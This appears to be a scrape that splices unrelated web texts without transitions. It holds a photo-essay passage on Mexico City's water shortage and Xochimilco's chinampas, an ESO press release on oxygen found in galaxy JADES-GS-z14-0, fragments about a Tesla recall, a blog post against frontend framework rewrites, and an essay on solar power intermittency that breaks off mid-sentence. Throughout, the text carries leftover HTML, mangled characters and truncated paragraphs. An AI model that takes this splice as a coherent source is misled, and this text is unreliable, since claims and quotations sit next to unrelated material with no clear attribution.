</span></p></div><div><p><span>This crisis has also disrupted tourism, a cornerstone of the local economy. The reservoir lake has experienced some of the lowest levels in its history, making it harder for visitors to enjoy popular water sports in the area, such as skiing, flyboarding, paddle surfing, kayaking, sailing, and fishing. Angered Valle de Bravo inhabitants are pressuring authorities to regulate water usage for swimming pools on properties used mostly by tourists and property owners from big cities who vacation there. </span></p></div><div><div><p><img alt="A water pipe of the Cutzamala water system, May 8, 2024." loading="lazy" width="2560" height="1921" decoding="async" data-nimg="1" srcset="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-4-scaled.jpg&amp;w=3840&amp;q=75 1x" src="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-4-scaled.jpg&amp;w=3840&amp;q=75"><span></span></p><p><span>A water pipe of the Cutzamala water system, May 8, 2024.

</span></p></div></div><div><p><span>Following months of severe drought in 2024, the late arrival of seasonal rains and emergency conservation measures such as localized rainwater harvesting brought some relief. The Cutzamala reservoir‚Äôs capacity increased to 67% in November 2024, up from 30% in May, according to data from Mexico‚Äôs National Water Commission. Government actions, including water rationing in Mexico City, likely contributed to this recovery. This increased capacity also provided temporary relief to the capital, which saw more consistent water distribution and fewer interruptions for urban areas. By February 2025, the reserve registered levels close to 61% of its capacity, which is still below the average levels of 72.3%, according to Valle de Bravo‚Äôs local water authorities. </span></p></div><div id="video-block-1047634905"><p><span>The Cutzamala pumping system provides much of the drinking water to Mexico City, May 8, 2024.</span><span>Video by Alan Y√†√±ez</span></p></div><div><p><span>In addition, wildfires have become an increasing threat to the area.

<p><span>But the recovering water levels have not fully addressed concerns by communities around the reservoir, including Valle de Bravo, about resource depletion and inequitable water distribution. Residents remain wary of government priorities that seem to favor urban supply and wealthy real estate investors over the needs of local residents. And without sustainable practices and investments in the area‚Äôs water systems, the cycle of scarcity will persist, continuing to threaten livelihoods and lives.</span></p></div><div><p><img alt="Several pumping engines at the beginning of the Cutzamala system, May 8, 2024." loading="lazy" width="2560" height="1921" decoding="async" data-nimg="1" srcset="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-8-scaled.jpg&amp;w=3840&amp;q=75 1x" src="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-8-scaled.jpg&amp;w=3840&amp;q=75"><span></span></p><p><span>Several pumping engines at the beginning of the Cutzamala system, May 8, 2024.
</span></p></div></div><div><div><p><span>Mexico City was built on top of what used to be a large body of water, which would make its water shortage appear ironic if it wasn‚Äôt so tragic. In the early 1300s, the Mexica (or Aztecs) settled on an island in the middle of what used to be a huge lake called Texcoco, the largest among five intertwined lakes.&nbsp;</span></p>

<p><span>But after the arrival of the Spaniards, the city started to expand, and the urban sprawl caused the lake system to dry up. By the early 20th century, the rivers feeding the once-rich lake zone were put into pipelines to make way for motor vehicles. Very little is left of the lakes, while the rivers have become practically invisible.</span></p></div><div><div><p><img alt="A ‚Äúpipero‚Äù ‚Äî a tanker truck driver who distributes drinking water to neighborhoods where it is in short supply ‚Äî jumps from a tanker truck, May 27, 2024." loading="lazy" width="2560" height="1921" decoding="async" data-nimg="1" srcset="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-11-scaled.jpg&amp;w=3840&amp;q=75 1x" src="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-11-scaled.jpg&amp;w=3840&amp;q=75"><span></span></p><p><span>A ‚Äúpipero‚Äù ‚Äî a tanker truck driver who distributes drinking water to neighborhoods where it is in short supply ‚Äî jumps from a tanker truck, May 27, 2024.

</span></p></div></div><div><p><span>Groundwater, depleted by decades of overexploitation, along with the soft soil that used to be the lake bed, can no longer support the megalopolis. The sections of the city built on top of where the lakes used to be are literally sinking under their own weight.&nbsp;</span></p>

<p><span>The city‚Äôs sinking also causes major water leaks and spills, as underground pipelines fracture. Seismic activity, common in Mexico City, worsens the situation. Research from Mexico‚Äôs National Autonomous University indicates that 40% of Mexico City‚Äôs water is lost due to these spills.</span></p>

<p><span>‚ÄúThe settlement and historical development of this huge city, since pre-Columbian times, is in a closed basin on the bed of a lake,‚Äù says Hilda Hesselbach, a consultant for international development agencies in Mexico and a biologist specializing in nature conservation issues, including water preservation. ‚ÄúSo, among the main problems of the water crisis come floods and, in part, differential sinking of the city due to compression of the ground.‚Äù&nbsp;</span></p>

<p><span>This is particularly evident in Mexico City‚Äôs historic downtown, where buildings and avenues buckle and tilt as they descend into the unstable soil. It also extends to nearby areas like the working-class suburbs of Ecatepec, where the problem is as glaringly obvious as Norma‚Äôs sunken bedroom.</span></p></div><div><div><p><img alt="A young boy helps his father fill a can of water that he has just drawn from a manhole in the street, May 27, 2024." loading="lazy" width="2560" height="1708" decoding="async" data-nimg="1" srcset="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-13-scaled.jpg&amp;w=3840&amp;q=75 1x" src="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-13-scaled.jpg&amp;w=3840&amp;q=75"><span></span></p><p><span>A young boy helps his father fill a can of water that he has just drawn from a manhole in the street, May 27, 2024.

But the area does get a significant amount of rain throughout the year (between 23 and 47 inches per annum), which is why nearly three-quarters of Mexico City‚Äôs water comes from </span><span>underground wells and springs. ‚ÄúBut since there has not been any real urban planning based on water, many of these groundwater recharge areas have been sealed off as a result of urban growth,‚Äù Hesselbach says.</span></p>

<p><span>‚ÄúIt‚Äôs an inefficient, not to say absurd, water management scheme,‚Äù she adds, citing poor administrative and planning systems with no effective current regulations.

<p><span>Taking advantage of the authorities‚Äô lack of supervision, criminal groups steal water from public wells and pipes to sell it to local residents.

<p><span>The agricultural islands, known as chinampas, were created over 2,000 years ago by Indigenous peoples of the Mexico City basin. Five hundred years after the fall of the Mexica Empire, Xochimilco‚Äôs floating gardens are still cultivated and produce food, flowers, and ornamental plants. In 2018, the United Nations designated this area a Globally Important Agricultural Heritage System.</span></p>

<p><span>‚ÄúThese chinampas became the most productive food system in Mexico‚Äôs history, sustaining entire civilizations and proving that agriculture and ecology can coexist harmoniously,‚Äù says Johanna Hern√°ndez, a marketing director of Arca Tierra, a Mexican network dedicated to the sustainable production of food through regenerative agriculture and fair trade.</span></p></div><div><div><p><img alt="Farmers work in their chinampa in Xochimilco, May 25, 2019." loading="lazy" width="2560" height="1927" decoding="async" data-nimg="1" srcset="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-34-scaled.jpg&amp;w=3840&amp;q=75 1x" src="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-34-scaled.jpg&amp;w=3840&amp;q=75"><span></span></p><p><span>Farmers work in their chinampa in Xochimilco, May 25, 2019.

</span></p></div></div><div><p><span>To reach the floating agricultural plots, one must cross their polluted surroundings with chaotic concrete sprawl and relentless traffic before venturing down the canals. Urban expansion and low farming incomes force some to abandon these traditional practices for more profitable ventures, like converting chinampas into residential plots.</span></p>

<p><span>‚ÄúToday this vital agro-ecosystem is at serious risk. Urban pressure, abandonment, pollution, and the industrialization of the food system have led to only 20% of the 2,215 hectares (5,470 acres) of chinampas being actively cultivated,‚Äù says Hern√°ndez.</span><span></span></p>



<p><span>Preserving the chinampas is vital ‚Äî not only for their cultural heritage but also for their role in supporting local biodiversity and regulating the urban climate. The gardens are home to one of Mexico‚Äôs richest hubs of biodiversity, including the most iconic species of Xochimilco, the</span> <span>axolotl</span><b>,</b><span> an endemic amphibian once abundant here. Today it is critically endangered, threatened by urban pressure, the destruction of chinampas, water shortages, climate warming, and pesticide contamination.</span></p>

<p><span>Local and international organizations like Arca Tierra fight to save this ecosystem and make it sustainable. Since 2009, this nonprofit has worked to ensure sustainability by supporting small-scale farmers socially, ecologically, and economically. It implements agroforestry techniques in Xochimilco to restore soil health and biodiversity, while improving water management by reducing evaporation and improving water retention.</span></p></div><div><p><img alt="A farmer plowing a field with his horse in the Amecameca region, March 14, 2018." loading="lazy" width="2560" height="945" decoding="async" data-nimg="1" srcset="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-36-scaled.jpg&amp;w=3840&amp;q=75 1x" src="https://mexicocitywater.longlead.com/_next/image?url=https%3A%2F%2Fphoto.longlead-cms.decimalstudios.com%2Fwp-content%2Fuploads%2Fsites%2F5%2F2025%2F01%2FMCW_resized-36-scaled.jpg&amp;w=3840&amp;q=75"><span></span></p><p><span>A farmer plowing a field with his horse in the Amecameca region, March 14, 2018.
</span></p></div><div><p><span>Hern√°ndez says her organization envisions a day when chinampas will be appreciated as solutions rather than relics of the past.

<p><span>‚ÄúChinampas are a living example of how human intervention can be a force for good, fostering life and biodiversity. While it is often said that humans are the worst thing that has happened to the planet, Xochimilco proves otherwise.

<h3>Press Release</h3>


<p>20 March 2025</p>




<p>Two different teams of astronomers have detected oxygen in the most distant known galaxy, JADES-GS-z14-0. The discovery, reported in two separate studies, was made possible thanks to the Atacama Large Millimeter/submillimeter Array (ALMA), in which the European Southern Observatory (ESO) is a partner. This record-breaking detection is making astronomers rethink how quickly galaxies formed in the early Universe.</p>
<p dir="ltr"><a href="https://blogs.nasa.gov/webb/2024/05/30/nasas-james-webb-space-telescope-finds-most-distant-known-galaxy/">Discovered last year</a>, JADES-GS-z14-0 is the most distant confirmed galaxy ever found: it is so far away, its light took 13.4 billion years to reach us, meaning we see it as it was when the Universe was less than 300 million years old, about 2% of its present age. The new oxygen detection with <a href="https://www.eso.org/public/teles-instr/alma/">ALMA</a>, a telescope array in Chile‚Äôs Atacama Desert, suggests the galaxy is much more chemically mature than expected.</p>
<p dir="ltr">‚Äú<em>It is like finding an adolescent where you would only expect babies</em>,‚Äù says Sander Schouws, a PhD candidate at Leiden Observatory, the Netherlands, and first author of the Dutch-led study, now accepted for publication in <em>The Astrophysical Journal</em>. ‚Äú<em>The results show the galaxy has formed very rapidly and is also maturing rapidly, adding to a growing body of evidence that the formation of galaxies happens much faster than was expected</em>."&nbsp;</p>
<p dir="ltr">Galaxies usually start their lives full of young stars, which are made mostly of light elements like hydrogen and helium. As stars evolve, they create heavier elements like oxygen, which get dispersed through their host galaxy after they die. Researchers had thought that, at 300 million years old, the Universe was still too young to have galaxies ripe with heavy elements. However, the two ALMA studies indicate JADES-GS-z14-0 has about 10 times more heavy elements than expected.</p>
<p dir="ltr">‚Äú<em>I was astonished by the unexpected results because they opened a new view on the first phases of galaxy evolution</em>,‚Äù says Stefano Carniani, of the Scuola Normale Superiore of Pisa, Italy, and lead author on the paper now accepted for publication in <em>Astronomy &amp; Astrophysics</em>. ‚Äú<em>The evidence that a galaxy is already mature in the infant Universe raises questions about when and how galaxies formed</em>.‚Äù</p>
<p dir="ltr">The oxygen detection has also allowed astronomers to make their distance measurements to JADES-GS-z14-0 much more accurate. ‚Äú<em>The ALMA detection offers an extraordinarily precise measurement of the galaxy‚Äôs distance down to an uncertainty of just 0.005 percent. This level of precision ‚Äî analogous to being accurate within 5 cm over a distance of 1 km ‚Äî helps refine our understanding of distant galaxy properties</em>,‚Äù adds Eleonora Parlanti, a PhD student at the Scuola Normale Superiore of Pisa and author on the <em>Astronomy &amp; Astrophysics&nbsp;</em>study&nbsp;<a href="#1">[1]</a>.</p>
<p dir="ltr">‚Äú<em>While the galaxy was originally discovered with the&nbsp;<a href="https://webbtelescope.org/home">James Webb Space Telescope</a>, it took ALMA to confirm and precisely determine its enormous distance</em>,‚Äù <a href="#2">[2]</a> says Associate Professor Rychard Bouwens, a member of the team at Leiden Observatory. ‚Äú<em>This shows the amazing synergy between ALMA and JWST to reveal the formation and evolution of the first galaxies</em>.‚Äù</p>
<p dir="ltr">Gerg√∂ Popping, an ESO astronomer at the European ALMA Regional Centre who did not take part in the studies, says: <em>"I was really surprised by this clear detection of oxygen in JADES-GS-z14-0. It suggests galaxies can form more rapidly after the Big Bang than had previously been thought. This result showcases the important role ALMA plays in unraveling the conditions under which the first galaxies in our Universe formed."</em></p>
<h3>Notes</h3><p dir="ltr"><a name="1"></a>[1] Astronomers use a measurement known as&nbsp;<a href="https://hubblesite.org/contents/media/images/4509-Image.html">redshift</a> to determine the distance to extremely distant objects. Previous measurements indicated that the galaxy JADES-GS-z-14-0 was at a redshift between about 14.12 and 14.4. With their oxygen detections, both teams have now narrowed this down to a redshift around 14.18.</p>

ESO‚Äôs headquarters and its visitor centre and planetarium, the ESO Supernova, are located close to Munich in Germany, while the Chilean Atacama Desert, a marvellous place with unique conditions to observe the sky, hosts our telescopes. ESO operates three observing sites: La Silla, Paranal and Chajnantor. At Paranal, ESO operates the Very Large Telescope and its Very Large Telescope Interferometer, as well as survey telescopes such as VISTA. Also at Paranal ESO will host and operate the Cherenkov Telescope Array South, the world‚Äôs largest and most sensitive gamma-ray observatory. Together with international partners, ESO operates ALMA on Chajnantor, a facility that observes the skies in the millimetre and submillimetre range. At Cerro Armazones, near Paranal, we are building ‚Äúthe world‚Äôs biggest eye on the sky‚Äù ‚Äî ESO‚Äôs Extremely Large Telescope. From our offices in Santiago, Chile we support our operations in the country and engage with Chilean partners and society.&nbsp;</p>

            The recall could prove to be a setback for Tesla (<a href="https://www.cnn.com/markets/stocks/TSLA">TSLA</a>), whose stock has lost about half its value this year as the electric vehicle maker grapples with rising competition, an aging lineup and backlash against CEO Elon Musk‚Äôs controversial role overseeing cuts to federal spending in the Trump White House.

            The recall addresses the risk that a stainless-steel exterior trim panel can detach from the vehicle, making it a road hazard and boosting the risk of a crash, Tesla said. Tesla‚Äôs service will replace the rail panel assembly with a new one that meets durability testing requirements, the automaker said.

<div id="readability-page-1" class="page"><div><p>A lot of frontend teams are very convinced that rewriting their frontend will lead to the promised land. And I am the bearer of bad tidings.</p><p>If you are building a product that you hope has longevity, your frontend framework is the least interesting technical decision for you to make. And all of the time you spend arguing about it is wasted energy.</p><p>I will die on this hill.</p><p>If your product is still around in 5 years, you‚Äôre doing great and you should feel successful. But guess what? Whatever framework you choose will be obsolete in 5 years. That‚Äôs just how the frontend community has been operating, and I don‚Äôt expect it to change soon. Even the popular frameworks that are still around are completely different. Because change is the name of the game. So they‚Äôre gonna rewrite their shit too and just give it a new version number.</p><p>Product teams that are smart are getting off the treadmill. Whatever framework you currently have, start investing in getting to know it deeply. Learn the tools until they are not an impediment to your progress. That‚Äôs the only option. Replacing it with a shiny new tool is a trap.</p><p>I also wanna give a piece of candid advice to engineers who are searching for jobs. If you feel strongly about what framework you want to use, please make that a criteria for your job search. Please stop walking into teams and derailing everything by trying to convince them to switch from framework X to your framework of choice. It‚Äôs really annoying and tremendously costly.</p><p>I always have to start with the cynical take. It‚Äôs just how I am. But I do want to talk about what I think should be happening instead.</p><p>Companies that want to reduce the cost of their frontend tech becoming obsoleted so often should be looking to get back to fundamentals. Your teams should be working closer to the web platform with a lot less complex abstractions. We need to relearn what the web is capable of and go back to that.</p><p>Let‚Äôs be clear, I‚Äôm not suggesting this is strictly better and the answer to all of your problems. I‚Äôm suggesting this as an intentional business tradeoff that I think provides more value and is less costly in the long run. I believe if you stick closer to core web technologies, you‚Äôll be better able to hire capable engineers in the future without them convincing you they can‚Äôt do work without rewriting millions of lines of code.</p><p>And if you‚Äôre an engineer, you will be able to retain much higher market value over time if you dig into and understand core web technologies. I was here before react, and I‚Äôll be here after it dies. You may trade some job marketability today. But it does a lot more for career longevity than trying to learn every new thing that gets popular. And you see how quickly they discarded us when the market turned anyway. Knowing certain tech won‚Äôt save you from those realities.</p><p>I couldn‚Äôt speak this candidly about this stuff when I held a management role. People can‚Äôt help but question my motivations and whatever agenda I may be pushing. Either that or I get into a lot of trouble with my internal team because they think I‚Äôm talking about them. But this is just what I‚Äôve seen play out after doing this for 20+ years. And I feel like we need to be able to speak plainly.</p><p>This has been brewing in my head for a long time. The frontend ecosystem is kind of broken right now. And it‚Äôs frustrating to me for a few different reasons. New developers are having an extremely hard time learning enough skills to be gainfully employed. They are drowning in this complex garbage and feeling really disheartened. As a result, companies are finding it more difficult to do basic hiring. The bar is so high just to get a regular dev job. And everybody loses.</p><p>What‚Äôs even worse is that I believe a lot of this energy is wasted. People that are learning the current tech ecosystem are absolutely not learning web fundamentals. They are too abstracted away. And when the stack changes again, these folks are going to be at a serious disadvantage when they have to adapt away from what they learned. It‚Äôs a deep disservice to people‚Äôs professional careers, and it‚Äôs going to cause a lot of heartache later.</p><p>On a more personal note, this is frustrating to me because I think it‚Äôs a big part of why we‚Äôre seeing the web stagnate so much. I still run into lots of devs who are creative and enthusiastic about building cool things. They just can‚Äôt. They are trying and failing because the tools being recommended to them are just not approachable enough. And at the same time, they‚Äôre being convinced that learning fundamentals is a waste of time because it‚Äôs so different from what everybody is talking about.</p><p>I guess I want to close by stating my biases. I‚Äôm a web guy. I‚Äôve been bullish on the web for 20+ years, and I will continue to be. I think it is an extremely capable and unique platform for delivering software. And it has only gotten better over time while retaining an incredible level of backwards compatibility. The underlying tools we have are dope now. But our current framework layer is working against the grain instead of embracing the platform.</p><blockquote><p>This is from <a href="https://social.polotek.net/@polotek/112617458589147547">a recent thread I wrote on mastodon</a>.

As of 2023, solar made up around </span><a href="https://www.eia.gov/energyexplained/electricity/electricity-in-the-us-generation-capacity-and-sales.php#:~:text=Solar%20energy's%20share%20of%20total,less%20than%200.1%25%20in%201990." rel="">4% of overall electricity generation</a><span>, and </span><a href="https://www.construction-physics.com/p/energy-cheat-sheet" rel="">less than 1% of total US energy production</a><span>. That means that the main questions around solar PV are about its potential: how long can its rapid growth rate continue, and how large a fraction of our energy can it effectively supply?</span></p><p><span>The answer to this question is shaped by two salient facts about solar power. First, the cost of it has fallen precipitously over time. Since its invention in the 1950s, the cost of solar PV has fallen by a factor of </span><a href="https://www.construction-physics.com/p/how-did-solar-power-get-cheap-part" rel="">close to 10,000</a><span>.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-159434840" href="https://www.construction-physics.com/p/understanding-solar-energy#footnote-1-159434840" target="_self" rel="">1</a></span><span> In the last 10 years alone, the cost of solar PV cells has fallen by more than 50%, and they‚Äôre projected to get even cheaper. This has made solar PV one of the </span><a href="https://www.lazard.com/media/xemfey0k/lazards-lcoeplus-june-2024-_vf.pdf" rel="">cheapest methods of electricity generation</a><span>.</span></p><p><span>The second salient fact about solar PV is that it can‚Äôt generate electricity on demand. Unlike technologies that generate energy by burning fuel which can be turned off and on as needed (such as gas, coal, nuclear), solar is intermittent, and only generates power when the sun is shining.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-2-159434840" href="https://www.construction-physics.com/p/understanding-solar-energy#footnote-2-159434840" target="_self" rel="">2</a></span></p><p>The future potential of solar power is, broadly, a function of these two factors. Some folks think that solar‚Äôs intermittency will fundamentally limit how much of our energy it can supply. Therefore, they believe, we should deemphasize solar in favor of ‚Äúfirm‚Äù sources of energy like gas turbines, next-generation nuclear or advanced geothermal. Others argue that solar PV and storage batteries will get so cheap that its intermittency will become less and less of a factor: the cheaper it is to build, the more you can address solar‚Äôs intermittency by simply building more panels and storage to compensate.</p><p>While it‚Äôs hard to predict the future, some simple modeling seems to favor the second outcome. Supplying a large fraction of energy consumption purely on solar power does indeed require a large degree of ‚Äúoverbuilding‚Äù: that is, building solar PV and storage capacity greatly in excess of day to day energy consumption. But even with this overbuilding, it won‚Äôt take much progress in solar and storage costs for solar to be as cheap or cheaper than today‚Äôs electricity, even at very large fractions of electricity consumption.</p><p><span>Solar panels work by converting light from the sun into electricity.

The more intense the light, the more power the panel will produce. On Earth, sunlight reaches the top of the atmosphere with an </span><a href="https://en.wikipedia.org/wiki/Irradiance" rel="">irradiance</a><span> of 1,360 watts per square meter, but this gets attenuated as it travels through the air, and at Earth‚Äôs surface irradiance is about </span><a href="https://en.wikipedia.org/wiki/Solar_irradiance#On_Earth's_surface" rel="">1,000 watts (1 kilowatt) per square meter</a><span> when the sun is directly overhead and not blocked by clouds. So a 21% efficient solar panel will have a maximum output of 210 watts per square meter.</span></p><p>For a given spot on the Earth‚Äôs surface, irradiance will start at 0 watts per square meter when it‚Äôs completely dark, gradually rise to its maximum, and then fall back to zero at night. The graph below shows solar irradiance at the equator during a day in March.</p><p><span>Solar irradiance is maximized when light is perpendicular to the surface being struck: for a horizontal surface on the ground, this occurs when the sun is directly overhead. Because the earth is </span><a href="https://en.wikipedia.org/wiki/Figure_of_the_Earth" rel="">approximately</a><span> a sphere, the farther north you go, the more tilted the surface of the earth will be in relation to the sun (i.e: the lower the sun will be in the sky), reducing the irradiance on a horizontal surface. And because the tilt of the earth‚Äôs axis </span><a href="https://www.weather.gov/fsd/season#:~:text=This%20is%20why%20the%20Earth's,path%20of%20the%20Sun's%20energy." rel="">changes in relation to the sun during the year</a><span>, solar irradiance will also change depending on the time of year: in the northern hemisphere, irradiance rises in the summer and falls in the winter. Below is the solar irradiance in Atlanta, Georgia (where I live) compared to the irradiance at the equator on the same day in March.</span></p><p>And here‚Äôs the maximum irradiance on a horizontal surface in Atlanta over the course of a year.</p><p>This means that the same solar panel in the same location will produce markedly different amounts of power at different times of the year, even before considering things like cloud obstruction. If I have 20 square meters of solar panels with 20% conversion efficiency mounted flat on the ground near Atlanta, on a cloudless day in June these panels will generate close to four kilowatts of power at their peak output. On a cloudless day in January, their peak output will be around half that.</p><p><span>Day-night cycles, changing solar irradiance depending on time of year and geographic location, and cloud obstruction all mean that solar PV panels are often producing much less power than they theoretically could. The average capacity factor of utility-scale solar PV in the US </span><a href="https://www.eia.gov/electricity/annual/html/epa_04_08_b.html" rel="">is around 23%</a><span>, meaning that on average they produce 23% of the power they would if they were exposed to 1,000 watts per square meter of sunlight 24 hours a day. This capacity factor varies by location, with sunny Southwestern states having higher capacity factors than Northeastern states.</span></p><p>Peak power generation for a solar PV system will be in the middle of the day, when the sun is highest in the sky. This doesn‚Äôt align particularly well with patterns of electricity consumption, which tends to be highest in the early evening. For our 20 square meters of solar panels in Atlanta, here‚Äôs power produced, superimposed over the power consumption for a single family home.</p><p>We can see that the four kilowatts of power is substantially more than peak demand, which is less than two kilowatts. For most daylight hours, our solar system can more than meet our power demands. But peak demand occurs in the early evening, when solar production is virtually nothing. And our simulated house continues consuming power all through the night, when there‚Äôs no sunlight at all. This misalignment between electricity demand and solar PV supply is what produces the famous ‚Äúduck curve,‚Äù which shows power required from non-solar sources when there‚Äôs a significant amount of solar capacity on the grid.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F89e6a2a1-18ec-4fbc-9ae4-93792e5a208f_1200x556.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F89e6a2a1-18ec-4fbc-9ae4-93792e5a208f_1200x556.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F89e6a2a1-18ec-4fbc-9ae4-93792e5a208f_1200x556.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F89e6a2a1-18ec-4fbc-9ae4-93792e5a208f_1200x556.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F89e6a2a1-18ec-4fbc-9ae4-93792e5a208f_1200x556.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F89e6a2a1-18ec-4fbc-9ae4-93792e5a208f_1200x556.png" width="1200" height="556" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/89e6a2a1-18ec-4fbc-9ae4-93792e5a208f_1200x556.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:556,&quot;width&quot;:1200,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F89e6a2a1-18ec-4fbc-9ae4-93792e5a208f_1200x556.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F89e6a2a1-18ec-4fbc-9ae4-93792e5a208f_1200x556.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F89e6a2a1-18ec-4fbc-9ae4-93792e5a208f_1200x556.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F89e6a2a1-18ec-4fbc-9ae4-93792e5a208f_1200x556.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>In winter, the situation is even worse. Our simulated Atlanta house uses a heat pump for heating, driving up wintertime electricity consumption. Our January peak power demand is now more than 9 kilowatts, far more than our solar PV system can produce even at its peak. And reduced solar irradiance means that peak power production is down to around two kilowatts.</p><p>In June, our 20 square meters of solar panels could supply about 52% of our home‚Äôs electricity demand. In January, it could only supply about 10%.</p><p><span>And in fact, the situation is even worse than this, because this simple simulation doesn‚Äôt include cloud cover. Not only will clouds sporadically reduce the power generated from our panels, but cloud cover tends to be </span><a href="https://ieeexplore.ieee.org/document/6422379" rel="">higher in winter</a><span>, further reducing our already-anemic wintertime PV output. Here‚Äôs a week of output from our simulated 20 square meter PV system in January, with both no clouds and a simple cloud simulation.</span></p><p><span>This intermittency is the fundamental challenge with solar energy. We can‚Äôt turn sunlight off and on at will, and the amount of light a solar PV panel receives will vary depending on the time of day, time of year, and where on the Earth that panel is placed. At the same time, electricity demand will vary significantly, both over the course of a single day and seasonally, in ways that aren‚Äôt particularly convenient for solar PV. Peak electricity demand happens well outside peak solar hours, both over the course of a day and (assuming electrified heating) over the course of a year.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-3-159434840" href="https://www.construction-physics.com/p/understanding-solar-energy#footnote-3-159434840" target="_self" rel="">3</a></span></p><p>There are a few different ways we can address this intermittency problem. The most obvious one is to just use other sources of power when the sun isn‚Äôt shining; either power sources that can be turned on and off on demand (such as gas turbines), or other intermittent sources whose peaks are offset from solar (such as wind).</p><p>If we want to use an exclusively solar system, we have basically two strategies for dealing with intermittency. One is to increase the amount of power generated from our solar panels: this won‚Äôt let you generate power at night (on earth, anyway), but enough panel capacity can allow you to meet power demands in winter, low-light morning hours, or when it‚Äôs cloudy out. There are a variety of ways to increase panel power output:</p><ul><li><p>You can build more solar panels.</p></li><li><p><span>You can use solar cells with a higher conversion efficiency. Some research cells have reached nearly 50% efficiency, and the average conversion efficiency of commercial cells has </span><a href="https://www.eia.gov/energyexplained/solar/photovoltaics-and-electricity.php#:~:text=The%20efficiency%20that%20PV%20cells,%2Dof%2Dthe%20art%20modules." rel="">trended upwards over time</a><span>.</span></p></li><li><p>You can tilt the solar panels to face the sun at a more favorable angle. Tracking solar systems mount motors to the solar panels to allow them to follow the sun. In the US, roughly 96% of new utility-scale systems have single axis tracking (ie: the panels can vary their tilt in one direction). And even non-tracking utility-scale systems will typically be built at a fixed angle chosen to maximize sunlight exposure based on geographic location.</p></li><li><p><span>You can use mirrors or lenses to concentrate more light onto your solar panels. This type of system is called </span><a href="https://en.wikipedia.org/wiki/Concentrator_photovoltaics" rel="">concentrator photovoltaics</a><span>, but it‚Äôs not particularly popular.</span></p></li><li><p><span>You can put solar panels into space, in an orbit that lets them receive 